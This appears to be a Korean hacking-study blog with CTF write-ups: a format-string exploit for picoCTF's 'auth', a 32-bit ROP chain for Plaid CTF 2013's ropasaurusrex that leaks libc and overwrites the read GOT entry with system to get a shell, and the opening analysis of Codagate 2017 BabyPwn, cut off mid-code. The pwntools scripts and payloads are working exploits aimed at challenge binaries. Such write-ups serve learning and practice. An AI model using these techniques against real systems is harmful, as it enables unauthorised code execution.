class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Would you like to read the flag? (yes/no)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;no&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, Exiting...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;yes&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Received Unknown Input:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  read_flag();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;picoCTF# .&#x2F;auth</span><br><span class="line">Would you like to read the flag? (yes&#x2F;no)</span><br><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">Received Unknown Input:</span><br><span class="line"></span><br><span class="line">aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not *authenticated*!</span><br></pre></td></tr></table></figure>
<p><strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;2018shell2.picoctf.com&quot;</span>, <span class="number">52918</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./auth&quot;</span>)</span><br><span class="line">auth = e.sym[<span class="string">&#x27;authenticated&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;auth:<span class="number">1</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}</p>
</blockquote>
<hr>
<h2 id="PWN-D-2-2021-01-26"><a href="#PWN-D-2-2021-01-26" class="headerlink" title="PWN D+2 (2021.01.26)"></a>PWN D+2 (2021.01.26)<br></h2><hr>
<p>Plaid CTF 2013 - Challenge : ropasaurusrex </p>
<p><strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80483F4();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;WIN\n&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, <code>WIN</code>을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_80483F4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ .&#x2F;ropasaurusrex </span><br><span class="line">AAAA</span><br><span class="line">WIN</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure>
<p><strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, <code>WIN</code>을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ checksec --file&#x3D;ropasaurusrex</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		ropasaurusrex</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure>
<p><strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas read</span><br><span class="line">Dump of assembler code for function read@plt:</span><br><span class="line">   0x0804832c &lt;+0&gt;:	jmp    DWORD PTR ds:0x804961c</span><br><span class="line">   0x08048332 &lt;+6&gt;:	push   0x18</span><br><span class="line">   0x08048337 &lt;+11&gt;:	jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ disas write</span><br><span class="line">Dump of assembler code for function write@plt:</span><br><span class="line">   0x0804830c &lt;+0&gt;:	jmp    DWORD PTR ds:0x8049614</span><br><span class="line">   0x08048312 &lt;+6&gt;:	push   0x8</span><br><span class="line">   0x08048317 &lt;+11&gt;:	jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read got  : 0x0804961c</span><br><span class="line">&#x2F;&#x2F; read plt  : 0x0804832c</span><br><span class="line">&#x2F;&#x2F; write got : 0x08049614</span><br><span class="line">&#x2F;&#x2F; write plt : 0x0804830c</span><br></pre></td></tr></table></figure>
<p><strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line"> 80484b5:	5b                   	pop    %ebx</span><br><span class="line"> 80484b6:	5e                   	pop    %esi</span><br><span class="line"> 80484b7:	5f                   	pop    %edi</span><br><span class="line"> 80484b8:	5d                   	pop    %ebp</span><br><span class="line"> 80484b9:	c3                   	ret    </span><br><span class="line"> 80484ba:	8b 1c 24             	mov    (%esp),%ebx</span><br><span class="line"> 80484bd:	c3                   	ret    </span><br><span class="line">--</span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; pop pop pop r : 0x080484b6</span><br></pre></td></tr></table></figure>
<p><strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d &#x2F;lib32&#x2F;libc.so.6 | grep __read</span><br><span class="line">(생략)</span><br><span class="line">   df11b:	e8 00 65 00 00       	call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df27a:	e8 a1 63 00 00       	call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df42e:	e8 ed 61 00 00       	call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">000e5620 &lt;__read@@GLIBC_2.0&gt;:</span><br><span class="line">   e5639:	75 1d                	jne    e5658 &lt;__read@@GLIBC_2.0+0x38&gt;</span><br><span class="line">   e564c:	77 52                	ja     e56a0 &lt;__read@@GLIBC_2.0+0x80&gt;</span><br><span class="line">   e5680:	77 28                	ja     e56aa &lt;__read@@GLIBC_2.0+0x8a&gt;</span><br><span class="line">(생략)</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d &#x2F;lib32&#x2F;libc.so.6 | grep system</span><br><span class="line">0003ce10 &lt;__libc_system@@GLIBC_PRIVATE&gt;:</span><br><span class="line">   3ce24:	74 0a                	je     3ce30 &lt;__libc_system@@GLIBC_PRIVATE+0x20&gt;</span><br><span class="line">00127030 &lt;svcerr_systemerr@@GLIBC_2.0&gt;:</span><br><span class="line">  12708b:	75 04                	jne    127091 &lt;svcerr_systemerr@@GLIBC_2.0+0x61&gt;</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read offset   : 0xe5620</span><br><span class="line">&#x2F;&#x2F; system offset : 0x3ce24</span><br></pre></td></tr></table></figure>
<p><strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc &#x3D; read_addr - read_offset</span><br><span class="line">system &#x3D; libc + system_offset</span><br></pre></td></tr></table></figure>
<p><strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -h ropasaurusrex </span><br><span class="line"></span><br><span class="line">ropasaurusrex:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          00000008  08049628  08049628  00000628  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>마지막으로 objdump를 이용해서 <code>/bin/sh</code>을 저장할 bss 영역의 주소를 알아냈습니다</strong><br></p>
<ul>
<li>시나리오<br></li>
</ul>
<ol>
<li>write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br></li>
<li>read 함수를 호출해서 bss 영역에 <code>&quot;/bin/sh&quot;</code>을 넣어준다.</li>
<li>read 함수를 호출해서 read got의 system addr을 넣어준다.</li>
<li>read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 <code>&quot;/bin/sh&quot;</code>가 들어있다.<br>

</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x0804832c</span></span><br><span class="line">read_got = <span class="number">0x0804961c</span></span><br><span class="line">read_off = <span class="number">0xe5620</span></span><br><span class="line">write_plt = <span class="number">0x0804830c</span></span><br><span class="line">write_got = <span class="number">0x08049614</span></span><br><span class="line">pppr = <span class="number">0x080484b6</span></span><br><span class="line">dynamic = <span class="number">0x08049530</span></span><br><span class="line">system_off = <span class="number">0x3ce10</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">136</span> + <span class="number">4</span>) <span class="comment"># buffer + sfp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (1)</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (2)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (3)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (4)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x41414141</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">readaddr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = readaddr - read_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(p32(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;ropasaurusrex&#39;: pid 8695</span><br><span class="line">0xf7d6e000</span><br><span class="line">0xf7daae10</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(pocas) gid&#x3D;1000(pocas) groups&#x3D;1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ cat key</span><br><span class="line">you_cant_stop_the_ropasaurusrex</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : you_cant_stop_the_ropasaurusrex</p>
</blockquote>
<hr>
<h2 id="PWN-D-3-2021-01-27"><a href="#PWN-D-3-2021-01-27" class="headerlink" title="PWN D+3 (2021.01.27)"></a>PWN D+3 (2021.01.27)<br></h2><hr>
<p>Codagate 2017 Challenge : BabyPwn</p>
<p><strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ checksec --file&#x3D;babypwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		babypwn</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ </span><br></pre></td></tr></table></figure>
<p><strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">socklen_t</span> addr_len; <span class="comment">// [esp+20h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> optval; <span class="comment">// [esp+24h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+2Ch] [ebp-24h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">v7</span>;</span> <span class="comment">// [esp+3Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">    v5 = atoi(a2[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">8181</span>;</span><br><span class="line">  dword_804B1BC = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804B1BC == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] socket Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(v5);</span><br><span class="line">  *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  bzero(&amp;addr.sa_data[<span class="number">6</span>], <span class="number">8u</span>);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  setsockopt(dword_804B1BC, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bind(dword_804B1BC, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] bind Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(dword_804B1BC, <span class="number">1024</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] listen Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr_len = <span class="number">16</span>;</span><br><span class="line">      fd = accept(dword_804B1BC, &amp;v7, &amp;addr_len);</span><br><span class="line">      <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      perror(<span class="string">&quot;[!] accept Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !fork() )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">while</span> ( waitpid(<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8048B87();</span><br><span class="line">  close(dword_804B1BC);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048A71</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;\n===============================\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;1. Echo\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;2. Reverse Echo\n&quot;</span>);</span><br><span class="line">        